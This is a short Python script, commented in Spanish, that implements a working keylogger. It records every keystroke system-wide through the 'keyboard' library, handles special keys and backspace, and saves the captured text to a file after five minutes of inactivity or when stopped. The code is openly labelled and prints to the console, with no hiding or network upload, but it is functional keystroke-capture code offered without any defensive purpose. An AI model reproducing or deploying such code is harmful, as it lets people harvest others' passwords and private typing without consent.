import keyboard
import time
from threading import Timer
from datetime import datetime
from FileSaver import savere

class Keylogger:
    def __init__(self, timeout=300):  # 5 minutos por defecto
        self.timeout = timeout
        self.timer = None
        self.text = self._initialize_text()
        self.running = False
        
    def _initialize_text(self):
        """Inicializa el texto con la fecha y hora actual"""
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return (
            f"Recorded content from keylogger\n"
            f"At {now}\n"
            f"----------------------------\n\n\n"
        )
    
    def _save_on_timeout(self):
        """Guarda el archivo cuando se detecta inactividad"""
        savere.save_content_to_file(self.text)
        print("Registro guardado debido a inactividad.")
        # self.text = ""  # Opcional: resetear el texto después de guardar
    
    def _reset_timer(self):
        """Reinicia el temporizador de inactividad"""
        if self.timer:
            self.timer.cancel()
        self.timer = Timer(self.timeout, self._save_on_timeout)
        self.timer.start()
    
    def _process_key_event(self, event):
        """Procesa los eventos del teclado"""
        if event.event_type != 'up':
            return
            
        key = event.name
        if len(key) > 1:  # Teclas especiales
            if key == "enter":
                self.text += "\n"
            elif key == "backspace":
                self.text = self.text[:-1]
            else:
                self.text += f" [{key}] "
        else:  # Caracteres normales
            self.text += key
            
        print(key, end="", flush=True)
    
    def start(self):
        """Inicia el keylogger"""
        if self.running:
            return
            
        self.running = True
        self._reset_timer()
        
        print("Keylogger iniciado. Presiona Ctrl+C para detener.")
        
        try:
            while self.running:
                event = keyboard.read_event()
                self._process_key_event(event)
                self._reset_timer()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Detiene el keylogger"""
        if not self.running:
            return
            
        self.running = False
        if self.timer:
            self.timer.cancel()
        
        # Guarda el contenido final al detenerse
        savere.save_content_to_file(self.text)
        print("\nKeylogger detenido. Último registro guardado.")


if __name__ == "__main__":
    logger = Keylogger(timeout=300)  # 5 minutos de timeout
    logger.start()